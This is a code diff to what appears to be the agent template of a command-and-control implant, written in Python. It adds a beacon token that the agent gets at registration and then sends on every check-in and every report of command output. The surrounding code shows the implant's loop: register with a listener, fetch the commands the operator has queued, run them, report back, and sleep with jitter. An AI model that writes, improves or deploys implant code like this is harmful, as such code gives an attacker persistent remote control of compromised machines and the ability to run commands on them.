@@ -667,9 +667,11 @@ class BaseTransport:
 class TCPTransport(BaseTransport):
     """Newline-delimited JSON over a single long-lived connection.
 
-    The listener reads with readline() and keeps a session bound to the
-    connection that registered, so a fresh socket per beacon would either be
-    misparsed or re-register the agent as a new session every time.
+    The listener reads with readline(), so one request per socket would mean
+    registering again for every beacon and leaving another session behind each
+    time. What makes a beacon ours is the token registration handed back, not this
+    socket — keeping the connection is about not multiplying sessions, not about
+    being recognised.
     """
     name = "tcp"
 
@@ -1500,12 +1502,13 @@ def _dispatch(task: dict) -> dict:
 
 def _c2_roundtrip(transport) -> bool:
     """Register, then beacon on that session until the link breaks."""
-    session_id = _register(transport)
+    session_id, beacon = _register(transport)
     _log(f"registered as session {session_id}")
-    _run_session(transport, session_id)
+    _run_session(transport, session_id, beacon)
     return True
 
-def _register(transport) -> str:
+def _register(transport) -> tuple:
+    """Register and return (session_id, beacon_token)."""
     ident = identity()
     resp = transport.request({
         "type": "register",
@@ -1526,19 +1529,30 @@ def _register(transport) -> str:
         raise SystemExit(3)
     if resp.get("type") != "registered" or not resp.get("session_id"):
         raise TransportError(f"register refused: {resp!r}")
-    return resp["session_id"]
+    # The token is what makes the next messages ours rather than merely addressed
+    # to us. A server that withholds it is one we cannot beacon against, so treat
+    # its absence as a failed registration rather than starting a session that the
+    # listener will refuse every turn around.
+    beacon = resp.get("beacon_token", "")
+    if not beacon:
+        raise TransportError("registered without a beacon token")
+    return resp["session_id"], beacon
 
-def _run_session(transport, session_id: str) -> None:
+def _run_session(transport, session_id: str, beacon: str) -> None:
     """Check in, run what the server queues, report back, repeat.
 
-    Returns only when the connection fails; main() then re-registers. Sleeping
-    between check-ins happens on the same socket because the listener ties the
-    session to the connection that opened it.
+    Returns only when the connection fails; main() then re-registers. The beacon
+    token from registration travels on both message types, because a session id
+    only names a session and anyone reading operator output can get one.
     """
     base_sleep = {{ cfg.sleep }}
     jitter_pct = {{ cfg.jitter }}
     while True:
-        resp = transport.request({"type": "checkin", "session_id": session_id})
+        resp = transport.request({
+            "type": "checkin",
+            "session_id": session_id,
+            "beacon": beacon,
+        })
         if resp.get("type") == "error":
             raise TransportError(f"checkin refused: {resp.get('message')}")
         for task in resp.get("commands", []):
@@ -1548,6 +1562,7 @@ def _run_session(transport, session_id: str) -> None:
                 "session_id": session_id,
                 "command_id": task.get("command_id", ""),
                 "output": result,
+                "beacon": beacon,
             })
         _jittered_sleep(base_sleep, jitter_pct)
 
